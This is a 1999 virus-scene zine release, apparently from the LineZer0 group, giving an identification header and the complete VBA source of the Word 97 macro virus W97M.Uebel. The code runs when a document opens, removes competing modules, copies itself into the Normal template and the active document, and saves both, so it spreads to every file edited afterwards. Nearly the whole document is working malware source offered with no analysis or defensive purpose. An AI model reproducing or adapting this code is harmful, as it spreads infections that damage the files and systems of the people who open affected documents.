<-------------------------//LineZer0 Network 99\\------------------------->
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=

~Word97Macro.Uebel~
===================

Identification:
~~~~~~~~~~~~~~~

	~Virusname: 	W97M.Uebel
	~Size:		31.744 Bytes
	~Version:	A
	~Origin:  	Austria
	~Author:	jack twoflower / LineZer0 / Metaphase
	~Date:		March, 1999

Features:
~~~~~~~

	~Application	Word 97
	~Payload: 	Nope
	~Stealth: 	Nope
	~Retro: 	Nope
	~SR-1 comp.: 	Yes
	~Polymorph:	Nope
	~Encrypted: 	Nope
        ~Special:       Uses AMI beta v0.1 infection method



------> code starts here <--------

Sub AutoOpen()
    IstMirSchlecht
End Sub
Sub IstMirSchlecht()

' This virus uses AMI beta version o.1

On Error Resume Next
Set Norm = NormalTemplate.VBProject.VBComponents
Set Acti = ActiveDocument.VBProject.VBComponents
Const ActiveModulName = "uebel"

For i = 1 To Norm.Count
    If Norm(i).Name = ActiveModulName Then NormIns = True
    If Norm(i).Name = "Modul1" And NormIns = False Then KillSomeNormModul = True
Next

For i = 1 To Acti.Count
    If Acti(i).Name = ActiveModulName Then ActIns = True
    If Acti(i).Name = "Modul1" And ActIns = False Then KillSomeActModul = True
Next

If KillSomeNormModul = True Then
    Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:="Modul1", Object:=wdOrganizerObjectProjectItems
End If

If KillSomeActModul = True Then
    Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:="Modul1", Object:=wdOrganizerObjectProjectItems
End If

If NormIns = False Then
    CheckRefNormal
    Norm.Add (vbext_ct_StdModule)
    Norm("Modul1").Name = ActiveModulName
    ActiveLines = ActiveDocument.VBProject.VBComponents(ActiveModulName).CodeModule.CountOfLines
    ActContent = ActiveDocument.VBProject.VBComponents(ActiveModulName).CodeModule.Lines(1, ActiveLines)
    Norm(ActiveModulName).CodeModule.AddFromString (ActContent)
    NormalTemplate.Save
End If
    
If ActIns = False Then
    CheckRefActive
    Acti.Add (vbext_ct_StdModule)
    Acti("Modul1").Name = ActiveModulName
    NormLines = NormalTemplate.VBProject.VBComponents(ActiveModulName).CodeModule.CountOfLines
    NormContent = NormalTemplate.VBProject.VBComponents(ActiveModulName).CodeModule.Lines(1, NormLines)
    Acti(ActiveModulName).CodeModule.AddFromString (NormContent)
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

End Sub

Function CheckRefNormal()
CheckRefNormal = False

For i = 1 To NormalTemplate.VBProject.References.Count
    If NormalTemplate.VBProject.References(i).Name = "VBIDE" Then CheckRefNormal = True
Next

If CheckRefNormal = False Then
    NormalTemplate.VBProject.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If

End Function

Function CheckRefActive()
CheckRefActive = False

For i = 1 To ActiveDocument.VBProject.References.Count
    If ActiveDocument.VBProject.References(i).Name = "VBIDE" Then CheckRefActive = True
Next

If CheckRefActive = False Then
    ActiveDocument.VBProject.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If

End Function

---------> code ends here <---------